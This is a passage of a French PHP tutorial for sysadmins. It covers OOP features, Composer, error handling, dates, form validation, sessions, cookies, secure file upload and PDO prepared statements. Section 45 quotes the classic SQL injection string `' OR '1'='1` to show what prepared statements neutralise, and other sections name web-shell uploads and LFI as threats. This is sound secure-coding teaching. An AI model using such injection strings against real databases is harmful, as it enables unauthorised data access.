// new Equipement(...); // ERREUR : classe abstraite
```

**Règles :** `extends` = **une seule** classe parente. Préfère la **composition** (un objet qui *possède* un autre) à l'héritage profond. Un héritage de plus de 2 niveaux = code smell.


---

## 25. Interfaces — les contrats

```php
<?php declare(strict_types=1);

// --- Une interface = un contrat : "tout objet qui fait X expose ces méthodes" ---
interface Alertable
{
    public function envoyerAlerte(string $message, string $niveau): bool;
}

interface Supervisable
{
    public function getMetriques(): array;
}

// --- Une classe peut implémenter PLUSIEURS interfaces ---
class OnduleurConnecte implements Alertable, Supervisable
{
    public function envoyerAlerte(string $message, string $niveau): bool
    {
        // envoi mail/SNMP...
        return true;
    }

    public function getMetriques(): array
    {
        return ['charge' => 65.0, 'batterie' => 98.0];
    }
}

// --- Typer par l'interface, pas par la classe : découplage ---
function diffuserAlerte(Alertable $equipement, string $msg): void
{
    $equipement->envoyerAlerte($msg, 'critique');
    // Accepte OnduleurConnecte ET tout autre objet Alertable (clim, groupe électrogène...)
}
```

**Quand utiliser quoi :**

| Besoin | Outil |
|---|---|
| Contrat de comportement partagé par des classes sans lien | `interface` |
| Code + état partagés dans une hiérarchie | classe abstraite / héritage |
| Réutiliser du code entre classes sans lien | `trait` (section 26) |

---

## 26. Traits — réutilisation horizontale de code

```php
<?php declare(strict_types=1);

// --- Un trait = un bloc de méthodes réutilisable dans n'importe quelle classe ---
trait Journalisable
{
    private array $journal = [];

    public function journaliser(string $message): void
    {
        $this->journal[] = date('Y-m-d H:i:s') . ' ' . $message;
    }

    public function getJournal(): array
    {
        return $this->journal;
    }
}

trait Horodatable
{
    public function maintenant(): string
    {
        return date('Y-m-d H:i:s');
    }
}

class Intervention
{
    use Journalisable;   // importe les méthodes du trait
    use Horodatable;

    public function cloturer(): void
    {
        $this->journaliser('Intervention clôturée');
    }
}

$inter = new Intervention();
$inter->cloturer();
print_r($inter->getJournal());

// --- Conflit entre traits : résolution explicite ---
trait A { public function qui(): string { return 'A'; } }
trait B { public function qui(): string { return 'B'; } }
class C
{
    use A, B {
        A::qui insteadof B;   // A gagne
        B::qui as quiDeB;      // alias pour garder B accessible
    }
}
```

---

## 27. Enums (PHP 8.1) — fini les constantes magiques

```php
<?php declare(strict_types=1);

// --- Enum pure ---
enum StatutIntervention
{
    case Planifiee;
    case EnCours;
    case Cloturee;
    case Annulee;
}

function changerStatut(StatutIntervention $statut): void
{
    // $statut ne peut être QUE l'une des 4 valeurs — impossible de passer "nimporte quoi"
    echo match ($statut) {
        StatutIntervention::Planifiee => 'à venir',
        StatutIntervention::EnCours   => 'en cours',
        StatutIntervention::Cloturee  => 'terminée',
        StatutIntervention::Annulee   => 'annulée',
    };
}
changerStatut(StatutIntervention::EnCours);

// --- Enum adossée (backed) : valeur scalaire associée — idéale pour la BDD ---
enum NiveauAlarme: string
{
    case Info     = 'info';
    case Warning  = 'warning';
    case Critique = 'critique';
}

$niveau = NiveauAlarme::from('critique');      // lève ValueError si valeur inconnue
$niveau = NiveauAlarme::tryFrom($_POST['n'] ?? ''); // null si inconnue ✅ (validation d'entrée !)
echo $niveau->value;  // "critique"
echo $niveau->name;   // "Critique"

// --- Méthodes dans les enums ---
enum Priorite: int
{
    case Basse = 1;
    case Normale = 2;
    case Haute = 3;

    public function delaiInterventionHeures(): int
    {
        return match ($this) {
            self::Basse   => 72,
            self::Normale  => 24,
            self::Haute   => 4,
        };
    }
}
```

🔒 **Usage sysadmin :** les enums adossées sont parfaites pour valider les entrées utilisateur à valeurs fermées (statuts, rôles, niveaux) — voir section 38.

---

## 28. Namespaces — organiser le code

```php
<?php declare(strict_types=1);

// --- Déclaration : première instruction après declare ---
namespace App\Supervision;

class Sonde
{
    // ...
}

// --- Utilisation depuis un autre fichier ---
namespace App\Web;

use App\Supervision\Sonde;              // import
use App\Supervision\Alerte as AlerteSup; // alias en cas de collision
use function App\outils\formaterDuree;   // import de fonction
use const App\outils\SEUIL;              // import de constante

$sonde = new Sonde();                    // résolu via le use
$autre = new \App\Autre\Truc();          // \ = nom pleinement qualifié (depuis la racine)

// --- Group use ---
use App\Supervision\{Sonde, Alerte, Rapport};
```

**Règles :** un namespace par fichier, `PascalCase` par segment, reflète l'arborescence des dossiers (`App\Supervision\Sonde` → `src/Supervision/Sonde.php`) — c'est la convention **PSR-4** (section 29).

---

## 29. Autoloading PSR-4 — plus jamais de require

```php
<?php
// ❌ AVANT (à bannir) :
// require 'src/Supervision/Sonde.php';
// require 'src/Supervision/Alerte.php';
// ... 50 lignes de require

// ✅ APRÈS : un seul autoloader (généré par Composer, section 30) :
require __DIR__ . '/vendor/autoload.php';

use App\Supervision\Sonde;
$sonde = new Sonde(); // la classe est chargée AUTOMATIQUEMENT à la première utilisation
```

Correspondance PSR-4 (`composer.json`) :

```json
{
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}
```

`App\Supervision\Sonde` → `src/Supervision/Sonde.php`. Après ajout d'une classe : `composer dump-autoload` (régénère la table).

🔒 **Sécurité :** l'autoloader ne charge que les classes déclarées — impossible d'inclure un fichier arbitraire via une classe. À comparer avec les `include $_GET['page']` (LFI, section 51).

---

## 30. Composer — le gestionnaire de dépendances

```bash
# Installation (méthode officielle, en root c'est OK pour l'install globale)
php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
php composer-setup.php --install-dir=/usr/local/bin --filename=composer
php -r "unlink('composer-setup.php');"
composer --version

# Nouveau projet
mkdir -p /var/www/appli && cd /var/www/appli
composer init --name="entreprise/appli" --type=project --no-interaction

# Ajouter une dépendance (ex. : client HTTP, validateur...)
composer require monolog/monolog
composer require --dev phpunit/phpunit   # dépendance de DEV uniquement

# Installer les dépendances d'un projet existant (déploiement !)
composer install --no-dev --optimize-autoloader --no-interaction

# Mettre à jour
composer update monolog/monolog   # une seule
composer update                   # toutes (⚠️ en dev, jamais en aveugle en prod)

# Voir les paquets obsolètes / vulnérables
composer outdated
composer audit                    # 🔒 audit de sécurité des dépendances
```

**Fichiers clés :**

| Fichier | Rôle | Versionné en git ? |
|---|---|---|
| `composer.json` | Dépendances déclarées | ✅ oui |
| `composer.lock` | Versions exactes installées | ✅ oui (garantit la reproductibilité) |
| `vendor/` | Code des dépendances | ❌ **non** (reconstruit par `composer install`) |

---

## 31. Composer en production — la procédure sûre

```bash
# Sur le serveur de PROD, déploiement type :
cd /var/www/appli

# 1. Jamais "composer update" en prod : on fige via le lock
composer install --no-dev --optimize-autoloader --no-interaction --no-progress

# 2. Vérifier qu'il ne manque rien
composer check-platform-reqs   # extensions PHP requises présentes ?

# 3. Droits : vendor lisible par www-data, jamais inscriptible
sudo chown -R root:www-data vendor
sudo chmod -R 755 vendor
```

`composer.json` — scripts utiles (lancés par `composer <nom>`) :

```json
{
    "scripts": {
        "lint": "find src -name '*.php' -exec php -l {} \\;",
        "tests": "phpunit --colors=always",
        "post-install-cmd": [
            "php bin/cache-clear.php"
        ]
    }
}
```

🔒 **Règles prod :** `--no-dev` (pas de phpunit/xdebug en prod), `vendor/` hors d'atteinte web si possible, `composer audit` dans la CI, et **jamais** de `composer` en root sur les fichiers de l'appli web (propriétaire dédié, ex. `deploy`).

---

## 32. Erreurs vs exceptions — comprendre le modèle PHP 8

Depuis PHP 7, **tout** est throwable : les erreurs fatales sont des objets `Error`.

```
Throwable
├── Error                    → erreurs du moteur (à ne PAS catcher sauf cas précis)
│   ├── TypeError            → mauvais type passé à une fonction typée
│   ├── ParseError           → syntaxe invalide (dans eval/include)
│   ├── DivisionByZeroError  → intdiv(1, 0)
│   └── ...
└── Exception                → erreurs applicatives (à catcher)
    ├── InvalidArgumentException, RuntimeException, LogicException (SPL)
    └── PDOException, JsonException...
```

```php
<?php declare(strict_types=1);

// Hiérarchie d'exceptions métier : un tronc commun = catch ciblé
class AppliException extends Exception {}
class ConfigException extends AppliException {}
class EquipementIntrouvableException extends AppliException {}

function getEquipement(int $id): array
{
    // ...
    throw new EquipementIntrouvableException("Équipement #$id introuvable");
}

try {
    $eq = getEquipement(999);
} catch (EquipementIntrouvableException $e) {
    http_response_code(404);
    echo "Introuvable";
} catch (AppliException $e) {
    // attrape ConfigException et toute autre AppliException
    http_response_code(500);
    error_log($e->getMessage());
}
```

**Philosophie :** les exceptions = cas **exceptionnels** (panne BDD, fichier absent). Pas de contrôle de flux normal avec `try/catch` (ex. : tester l'existence avant plutôt que catcher).

---

## 33. try / catch / finally — le mode d'emploi

```php
<?php declare(strict_types=1);

// --- finally : TOUJOURS exécuté (nettoyage garanti) ---
$fh = fopen('/var/log/import.log', 'a');
try {
    $data = json_decode($json, true, 512, JSON_THROW_ON_ERROR);
    traiter($data);
} catch (JsonException $e) {
    error_log("JSON invalide : " . $e->getMessage());
    $nbErreurs++;
} catch (Throwable $e) {           // filet de sécurité : attrape TOUT
    error_log("Échec import : " . get_class($e) . " : " . $e->getMessage());
} finally {
    fclose($fh);                  // libéré même si exception
}

// --- Multi-catch (PHP 7.1+) ---
try {
    $pdo = connecterBdd($dsn);
} catch (PDOException | ConfigException $e) {
    die("Base inaccessible");     // ⚠️ die() en CLI ; en web : page d'erreur propre (section 52)
}

// --- Relancer après log (enrichir le contexte) ---
try {
    sauvegarder($intervention);
} catch (PDOException $e) {
    error_log("Échec sauvegarde intervention #{$intervention->id}");
    throw $e;  // on laisse remonter après avoir loggué
    // ou : throw new AppliException("Sauvegarde impossible", 0, $e); // chaînage ($e = previous)
}

// --- $e->getPrevious() : remonter la chaîne ---
catch (AppliException $e) {
    $cause = $e->getPrevious(); // l'exception d'origine
}
```

---

## 34. Gestion d'erreurs globale — ne jamais montrer une stack trace

```php
<?php declare(strict_types=1);

// --- bootstrap.php : à inclure en tête de chaque point d'entrée web ---

// 1. Convertir les erreurs PHP (warnings, notices) en exceptions → un seul circuit de gestion
set_error_handler(function (int $errno, string $errstr, string $errfile, int $errline): bool {
    if (!(error_reporting() & $errno)) {
        return false; // erreur masquée par @ (qu'on n'utilise pas de toute façon)
    }
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});

// 2. Gestionnaire d'exceptions non capturées : page 500 PROPRE + log complet
set_exception_handler(function (Throwable $e): void {
    $id = bin2hex(random_bytes(6)); // identifiant pour corréler avec les logs
    error_log("[ERREUR $id] " . get_class($e) . " : " . $e->getMessage()
        . " dans " . $e->getFile() . ":" . $e->getLine()
        . "\n" . $e->getTraceAsString());

    http_response_code(500);
    // En DEV : afficher. En PROD : page générique.
    if (($_ENV['APP_ENV'] ?? 'prod') === 'dev') {
        echo "<h1>Erreur $id</h1><pre>" . htmlspecialchars((string) $e) . "</pre>";
    } else {
        echo "<h1>Erreur interne</h1><p>Référence : $id. L'équipe a été notifiée.</p>";
    }
});

// 3. Erreurs fatales (parse, mémoire) : shutdown function = dernier recours
register_shutdown_function(function (): void {
    $err = error_get_last();
    if ($err !== null && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
        error_log("[FATAL] {$err['message']} dans {$err['file']}:{$err['line']}");
        http_response_code(500);
        echo "<h1>Erreur interne</h1>";
    }
});
```

🔒 **En prod :** `display_errors=Off` (php.ini) + ce trio = **zéro fuite d'information** vers le visiteur, **100 % des erreurs** dans les logs avec un ID de corrélation.

---

## 35. Dates et heures — DateTimeImmutable

```php
<?php declare(strict_types=1);

// --- Création : TOUJOURS avec fuseau explicite ---
$maintenant = new DateTimeImmutable('now', new DateTimeZone('Europe/Paris'));
$intervention = new DateTimeImmutable('2026-10-05 14:30:00', new DateTimeZone('Europe/Paris'));

// --- Immuable = chaque modification retourne un NOUVEL objet ---
$rappel = $intervention->modify('-2 days');  // $intervention INCHANGÉE ✅
// (avec DateTime mutable, modify() change l'objet lui-même → bugs vicieux)

// --- Calculs ---
$duree = new DateInterval('PT2H30M');        // Période : 2h30 (P1D = 1 jour, PT15M = 15 min)
$fin = $intervention->add($duree);
$diff = $intervention->diff($fin);           // DateInterval
echo $diff->format('%h heures %i minutes');

// --- Comparaison directe (objets comparables) ---
if ($rappel < $maintenant) {
    echo "le rappel est passé";
}

// --- Formats ---
echo $intervention->format('Y-m-d H:i:s');  // 2026-10-05 14:30:00 (BDD)
echo $intervention->format('d/m/Y à H\hi'); // 05/10/2026 à 14h30 (affichage FR)
echo $intervention->format('c');            // ISO 8601 : 2026-10-05T14:30:00+02:00

// --- Depuis un format précis (formulaires FR !) ---
$date = DateTimeImmutable::createFromFormat('d/m/Y H:i', '05/10/2026 14:30');
if ($date === false) {
    // format invalide → erreur de validation
}

// --- Timestamp ---
$ts = $intervention->getTimestamp();        // secondes depuis 1970-01-01 UTC
$depuis = new DateTimeImmutable('@' . $ts);  // @ = timestamp (toujours UTC)
```

---

## 36. Dates — pièges et bonnes pratiques

```php
<?php declare(strict_types=1);

// --- 1. Stocker en UTC, afficher en locale ---
// BDD : colonne DATETIME/TIMESTAMP en UTC. Conversion à l'affichage :
$utc = new DateTimeImmutable('2026-10-05 12:30:00', new DateTimeZone('UTC'));
$paris = $utc->setTimezone(new DateTimeZone('Europe/Paris'));
echo $paris->format('d/m/Y H:i'); // 05/10/2026 14:30 (heure d'été)

// --- 2. "now" sans fuseau = fuseau de date.timezone (php.ini) ---
// ⚠️ Si date.timezone n'est pas défini : warning + supposition système. Toujours le définir.

// --- 3. Comparer des dates : objets, pas des strings ---
// "05/10/2026" < "12/09/2026" en string → FAUX résultat. En objets DateTime : correct.

// --- 4. Générer une plage de dates (planning) ---
$debut = new DateTimeImmutable('2026-10-01');
$fin   = new DateTimeImmutable('2026-10-07');
$periode = new DatePeriod($debut, new DateInterval('P1D'), $fin->modify('+1 day'));
foreach ($periode as $jour) {
    echo $jour->format('Y-m-d') . "\n";
}

// --- 5. Âge / ancienneté d'un équipement ---
$installation = new DateTimeImmutable('2019-03-15');
$age = $installation->diff(new DateTimeImmutable('now'));
echo "En service depuis {$age->y} ans et {$age->m} mois";

// --- 6. Tester "est-ce aujourd'hui ?" ---
$aujourdhui = (new DateTimeImmutable('now'))->format('Y-m-d') === $intervention->format('Y-m-d');
```

📋 **Checklist dates :** `DateTimeImmutable` partout (jamais `DateTime` mutable), fuseau explicite, stockage UTC, `date.timezone` défini dans php.ini, `createFromFormat` + test `=== false` pour les saisies.


---

## 37. Formulaires HTML — GET vs POST

```php
<?php // form.php — affiche ET traite (PRG pattern, voir plus bas) ?>
<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Demande d'intervention</title></head>
<body>
<form method="post" action="form.php">
    <!-- Toujours : label + name + type adapté + required côté HTML (1re barrière, pas la seule) -->
    <label for="site">Site :</label>
    <input type="text" id="site" name="site" required maxlength="100">

    <label for="email">E-mail :</label>
    <input type="email" id="email" name="email" required>

    <label for="priorite">Priorité :</label>
    <select id="priorite" name="priorite">
        <option value="basse">Basse</option>
        <option value="normale" selected>Normale</option>
        <option value="haute">Haute</option>
    </select>

    <label for="description">Description :</label>
    <textarea id="description" name="description" rows="5" required></textarea>

    <button type="submit">Envoyer</button>
</form>
</body>
</html>
```

| | GET | POST |
|---|---|---|
| Usage | Recherche, filtres, pagination (actions **sans effet**) | Création/modification/suppression (actions **avec effet**) |
| Données | Dans l'URL (visibles, loggées, limitées ~2 Ko) | Dans le corps (non visibles dans l'URL) |
| Idempotent | Oui (répétable sans risque) | Non → pattern **PRG** |

**Pattern PRG (Post/Redirect/Get) :** après un POST réussi, on **redirige** (302) vers une page GET. Ça évite le double envoi au refresh (F5) :

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ... valider, enregistrer ...
    header('Location: confirmation.php?id=' . $id);
    exit; // ⚠️ exit APRÈS header() : sinon le script continue !
}
```

---

## 38. Validation et assainissement — la discipline

**Deux opérations distinctes :**

1. **Valider** = vérifier que la donnée est conforme (refuser si non). *En entrée.*
2. **Assainir/échapper** = neutraliser pour un contexte de sortie (HTML, SQL, shell). *En sortie.*

```php
<?php declare(strict_types=1);

// --- VALIDATION : whitelist, jamais blacklist ---
function validerDemande(array $post): array
{
    $erreurs = [];

    // Texte : longueur + caractères autorisés
    $site = trim($post['site'] ?? '');
    if ($site === '' || mb_strlen($site) > 100) {
        $erreurs['site'] = 'Site requis (max 100 caractères).';
    } elseif (!preg_match('/^[\p{L}\p{N} .\-_]+$/u', $site)) {
        $erreurs['site'] = 'Caractères non autorisés.';
    }

    // E-mail : filtre dédié
    $email = trim($post['email'] ?? '');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $erreurs['email'] = 'E-mail invalide.';
    }

    // Valeur fermée : enum (impossible de tricher)
    $priorite = Priorite::tryFrom($post['priorite'] ?? '');
    if ($priorite === null) {
        $erreurs['priorite'] = 'Priorité invalide.';
    }

    // Entier dans une plage
    $duree = filter_var($post['duree'] ?? null, FILTER_VALIDATE_INT, [
        'options' => ['min_range' => 15, 'max_range' => 480],
    ]);
    if ($duree === false) {
        $erreurs['duree'] = 'Durée entre 15 et 480 minutes.';
    }

    return $erreurs; // vide = tout est valide
}

// --- ASSAINISSEMENT EN SORTIE (contexte HTML) ---
// On stocke la donnée BRUTE (validée) en BDD, on échappe À L'AFFICHAGE :
echo htmlspecialchars($site, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

🔒 **Règles :** valider **côté serveur** (le JS/HTML `required` se contourne en 2 clics), whitelist > blacklist, stocker brut + échapper à la sortie (jamais l'inverse — sinon double échappement).

---

## 39. filter_var / filter_input — les filtres natifs

```php
<?php declare(strict_types=1);

// --- Validation ---
filter_var('zelef@exemple.fr', FILTER_VALIDATE_EMAIL);   // string ou false
filter_var('10.0.0.11', FILTER_VALIDATE_IP);              // IP v4/v6
filter_var('10.0.0.11', FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE); // IPv4 publique
filter_var('https://exemple.fr/x', FILTER_VALIDATE_URL);
filter_var('42', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 100]]);
filter_var('oui', FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE); // true/false/null

// --- Assainissement (nettoyage) ---
filter_var('<b>test</b>', FILTER_SANITIZE_SPECIAL_CHARS); // &lt;b&gt;test&lt;/b&gt;
$tel = preg_replace('/[^0-9+ ]/', '', $saisieTel);        // garde chiffres/+ /espace

// --- filter_input : lit DIRECTEMENT la superglobale (préféré à $_POST brut) ---
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL); // null si absent, false si invalide
$id    = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

// --- Tester un booléen de case à cocher ---
$urgent = isset($_POST['urgent']); // checkbox : présente = cochée

// --- Regex utiles ---
preg_match('/^[\p{L}\p{N} .\-_]+$/u', $s);   // texte simple unicode
preg_match('/^[A-Z0-9-]{3,20}$/', $ref);     // référence équipement
```

| Filtre | Usage typique |
|---|---|
| `FILTER_VALIDATE_EMAIL` | e-mails |
| `FILTER_VALIDATE_INT` + `min_range`/`max_range` | IDs, quantités, durées |
| `FILTER_VALIDATE_IP` | adresses IP (whitelist réseau) |
| `FILTER_VALIDATE_URL` | URLs (limité : compléter par une whitelist de schémas `https`) |
| `FILTER_VALIDATE_BOOLEAN` + `FILTER_NULL_ON_FAILURE` | cases à cocher / flags |

---

## 40. Sessions — le mécanisme

```php
<?php declare(strict_types=1);
session_start(); // ⚠️ AVANT tout output HTML (en-têtes HTTP)

// --- Écriture / lecture ---
$_SESSION['utilisateur_id'] = 42;
$_SESSION['role'] = 'technicien';
$_SESSION['derniere_activite'] = time();

echo $_SESSION['role'] ?? 'invité';

// --- Déconnexion PROPRE ---
function deconnexion(): void
{
    $_SESSION = [];                        // vide le tableau
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'],
            $params['secure'], $params['httponly']); // supprime le cookie
    }
    session_destroy();                     // détruit la session côté serveur
}

// --- Où sont stockées les sessions ? ---
// Par défaut : fichiers dans /var/lib/php/sessions (session.save_path).
// En multi-serveurs / haute dispo : Redis (php8.4-redis) :
// session.save_handler = redis
// session.save_path = "tcp://127.0.0.1:6379"
```

**Cycle de vie :** `session_start()` lit le cookie `PHPSESSID` → charge le fichier correspondant → `$_SESSION` disponible. À la fin du script, PHP **verrouille** le fichier pendant toute la requête : deux requêtes AJAX simultanées du même user se **bloquent** mutuellement.

**Astuce perf :** `session_write_close()` dès qu'on n'écrit plus en session (libère le verrou) :

```php
session_start();
$userId = $_SESSION['utilisateur_id'] ?? null;
session_write_close(); // libère le verrou, lecture seule ensuite
// ... traitement long (appel API, génération PDF) sans bloquer les autres onglets ...
```

---

## 41. Sécurité des sessions — anti-hijacking

```php
<?php declare(strict_types=1);
session_start();

// --- 1. Régénérer l'ID à chaque changement de privilège (anti-fixation) ---
function login(int $userId): void
{
    session_regenerate_id(true); // true = supprime l'ancien fichier de session
    $_SESSION['utilisateur_id'] = $userId;
    $_SESSION['connecte'] = true;
}

// --- 2. Timeout d'inactivité (30 min) ---
$timeout = 1800;
if (isset($_SESSION['derniere_activite']) && time() - $_SESSION['derniere_activite'] > $timeout) {
    deconnexion();
    header('Location: login.php?timeout=1');
    exit;
}
$_SESSION['derniere_activite'] = time();

// --- 3. Lier (souplement) la session au client : user-agent + début d'IP ---
// ⚠️ IP complète = faux positifs (4G, VPN). On lie le /24 ou juste l'UA.
$empreinte = hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? '');
if (isset($_SESSION['empreinte']) && !hash_equals($_SESSION['empreinte'], $empreinte)) {
    deconnexion(); // user-agent changé en cours de session = suspect
    exit;
}
$_SESSION['empreinte'] ??= $empreinte;

// --- 4. php.ini (rappel section 5) ---
// session.cookie_httponly=1, session.cookie_secure=1, session.cookie_samesite=Lax,
// session.use_strict_mode=1, session.use_only_cookies=1
```

📋 **Checklist session :** `regenerate_id(true)` au login, timeout d'inactivité, empreinte UA, cookies `HttpOnly`+`Secure`+`SameSite`, `deconnexion()` complète, stockage Redis si plusieurs serveurs.

---

## 42. Cookies — posés proprement

```php
<?php declare(strict_types=1);

// --- setcookie() : AVANT tout output, tableau d'options (PHP 7.3+) ---
setcookie('theme', 'sombre', [
    'expires'  => time() + 86400 * 30, // 30 jours
    'path'     => '/',
    'domain'   => '',                   // '' = domaine courant
    'secure'   => true,                 // HTTPS uniquement 🔒
    'httponly' => true,                 // invisible pour JavaScript (anti-vol via XSS) 🔒
    'samesite' => 'Lax',                // 'Strict' = plus sûr, 'Lax' = compromis, 'None' = cross-site (requiert Secure)
]);

// --- Lecture : TOUJOURS considérer comme hostile ---
$theme = $_COOKIE['theme'] ?? 'clair';
if (!in_array($theme, ['clair', 'sombre'], true)) {
    $theme = 'clair'; // whitelist
}

// --- Suppression ---
setcookie('theme', '', ['expires' => time() - 3600, 'path' => '/']);

// --- Cookie signé : détecter la falsification (préférences, panier non critique) ---
define('COOKIE_SECRET', $_ENV['COOKIE_SECRET']); // 32 octets aléatoires, dans .env JAMAIS dans le code

function signerCookie(string $valeur): string
{
    $sig = hash_hmac('sha256', $valeur, COOKIE_SECRET);
    return base64_encode($valeur) . '.' . $sig;
}

function verifierCookie(string $cookie): ?string
{
    $parts = explode('.', $cookie);
    if (count($parts) !== 2) {
        return null;
    }
    [$b64, $sig] = $parts;
    $valeur = base64_decode($b64, true);
    if ($valeur === false) {
        return null;
    }
    // hash_equals : comparaison en temps constant (anti timing attack)
    return hash_equals(hash_hmac('sha256', $valeur, COOKIE_SECRET), $sig) ? $valeur : null;
}
```

🔒 **Jamais** de données sensibles en clair dans un cookie (rôle, user_id non signé). Le cookie de session suffit ; le reste = BDD.

---

## 43. Upload de fichiers — la procédure sécurisée

L'upload est **la faille la plus exploitée** : un `shell.php` uploadé = serveur compromis. Procédure stricte :

```php
<?php declare(strict_types=1);

// Formulaire : <form method="post" enctype="multipart/form-data">
//              <input type="file" name="rapport">

function traiterUpload(array $file): string
{
    // 1. Erreur d'upload ?
    if (($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
        throw new RuntimeException("Échec de l'envoi (code {$file['error']}).");
    }

    // 2. Taille (défense en profondeur : php.ini + ici)
    $maxOctets = 5 * 1024 * 1024; // 5 Mo
    if ($file['size'] > $maxOctets) {
        throw new RuntimeException("Fichier trop volumineux.");
    }

    // 3. Type MIME RÉEL (jamais $file['type'] — fourni par le client !)
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = $finfo->file($file['tmp_name']);
    $autorises = [
        'application/pdf' => 'pdf',
        'image/jpeg'      => 'jpg',
        'image/png'       => 'png',
    ];
    if (!isset($autorises[$mime])) {
        throw new RuntimeException("Type de fichier non autorisé ($mime).");
    }

    // 4. Nom de fichier : ON LE GÉNÈRE (jamais le nom d'origine)
    $nomFinal = bin2hex(random_bytes(16)) . '.' . $autorises[$mime];

    // 5. Destination HORS de la racine web si possible
    $destination = '/var/www/uploads/' . $nomFinal; // /var/www/uploads PAS servi par nginx

    // 6. Déplacement sécurisé (vérifie que c'est bien un upload HTTP)
    if (!move_uploaded_file($file['tmp_name'], $destination)) {
        throw new RuntimeException("Impossible d'enregistrer le fichier.");
    }
    chmod($destination, 0640);

    return $nomFinal; // à stocker en BDD
}

// Usage :
try {
    $nom = traiterUpload($_FILES['rapport']);
    // INSERT INTO documents (nom_stocke, ...) VALUES (...)
} catch (RuntimeException $e) {
    http_response_code(400);
    echo htmlspecialchars($e->getMessage());
}
```

📋 **Checklist upload :** `enctype` correct, test `error`, taille, MIME réel via `finfo` (whitelist extension→MIME), nom **généré** (pas celui du client), dossier **hors racine web** (ou `deny all` nginx + pas d'exécution PHP), `move_uploaded_file` uniquement, droits `0640`.

---

## 44. PDO — connexion propre

**PDO = la seule API BDD à utiliser** (`mysql_*` supprimé depuis PHP 7, `mysqli` procédural = à oublier).

```php
<?php declare(strict_types=1);

function creerPdo(array $config): PDO
{
    $dsn = sprintf(
        'mysql:host=%s;port=%d;dbname=%s;charset=utf8mb4',
        $config['host'], $config['port'], $config['dbname']
    );

    $pdo = new PDO($dsn, $config['user'], $config['pass'], [
        // 🔒 Les 3 options vitales :
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, // erreurs = exceptions (pas de die silencieux)
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,       // fetch = tableau associatif
        PDO::ATTR_EMULATE_PREPARES   => false,                  // vraies requêtes préparées côté serveur
    ]);

    return $pdo;
}

// --- Config depuis l'environnement (jamais en dur !) ---
$pdo = creerPdo([
    'host'   => $_ENV['DB_HOST'] ?? '127.0.0.1',
    'port'   => (int) ($_ENV['DB_PORT'] ?? 3306),
    'dbname' => $_ENV['DB_NAME'] ?? 'appli',
    'user'   => $_ENV['DB_USER'] ?? 'appli',
    'pass'   => $_ENV['DB_PASS'] ?? '',
]);

// --- PostgreSQL : DSN différent ---
// $dsn = 'pgsql:host=127.0.0.1;port=5432;dbname=appli;';
// --- SQLite (petits outils, tests) ---
// $pdo = new PDO('sqlite:/var/www/appli/data/appli.sqlite');
```

🔒 **Identifiants :** variables d'environnement ou fichier `.env` **hors racine web**, droits `0600`, jamais dans le code, jamais dans git. `charset=utf8mb4` obligatoire (emoji + sécurité).

---

## 45. Requêtes préparées — le seul moyen

```php
<?php declare(strict_types=1);

// --- SELECT avec paramètre nommé ---
$stmt = $pdo->prepare('SELECT id, site, statut FROM interventions WHERE site = :site AND statut = :statut');
$stmt->execute(['site' => $site, 'statut' => 'planifiee']);
$interventions = $stmt->fetchAll();          // tableau de tableaux
$premiere      = $stmt->fetch();             // une ligne ou false

// --- Paramètre positionnel (?) ---
$stmt = $pdo->prepare('SELECT * FROM equipements WHERE id = ?');
$stmt->execute([$id]);

// --- INSERT : lastInsertId ---
$stmt = $pdo->prepare('INSERT INTO interventions (site, description, priorite, cree_le)
                       VALUES (:site, :description, :priorite, NOW())');
$stmt->execute([
    'site'        => $site,
    'description' => $description,
    'priorite'    => $priorite->value, // enum adossée → string
]);
$id = (int) $pdo->lastInsertId();

// --- UPDATE / DELETE : rowCount ---
$stmt = $pdo->prepare('UPDATE interventions SET statut = :statut WHERE id = :id');
$stmt->execute(['statut' => 'cloturee', 'id' => $id]);
echo $stmt->rowCount() . " ligne(s) modifiée(s)";

// --- fetchColumn : une seule valeur ---
$nb = $pdo->query('SELECT COUNT(*) FROM interventions')->fetchColumn();

// --- Itérer sans tout charger en mémoire (gros volumes) ---
$stmt = $pdo->prepare('SELECT * FROM logs ORDER BY id');
$stmt->execute();
while ($ligne = $stmt->fetch()) {           // curseur : ligne par ligne
    traiterLigne($ligne);
}
```

**Pourquoi c'est LE seul moyen :** la requête et les données sont envoyées **séparément** au serveur SQL. Même si `$site` contient `' OR '1'='1`, c'est traité comme une **valeur**, jamais comme du code SQL. Aucun échappement manuel ne vaut ça.

---

## 46. Transactions PDO — tout ou rien

```php
<?php declare(strict_types=1);

// --- Cas : clôturer une intervention = MAJ intervention + INSERT rapport + décrément stock ---
try {
    $pdo->beginTransaction();

    $pdo->prepare('UPDATE interventions SET statut = :s WHERE id = :id')
        ->execute(['s' => 'cloturee', 'id' => $id]);

    $pdo->prepare('INSERT INTO rapports (intervention_id, contenu) VALUES (:id, :contenu)')
        ->execute(['id' => $id, 'contenu' => $contenu]);

    $pdo->prepare('UPDATE stock SET quantite = quantite - :q WHERE piece = :p')
        ->execute(['q' => $quantite, 'p' => $piece]);

    $pdo->commit(); // ✅ tout a réussi : on valide
    echo "Intervention clôturée.";
} catch (Throwable $e) {
    $pdo->rollBack(); // ❌ échec quelque part : on annule TOUT (aucune écriture partielle)
    error_log("Transaction échouée : " . $e->getMessage());
    http_response_code(500);
    echo "Erreur lors de la clôture.";
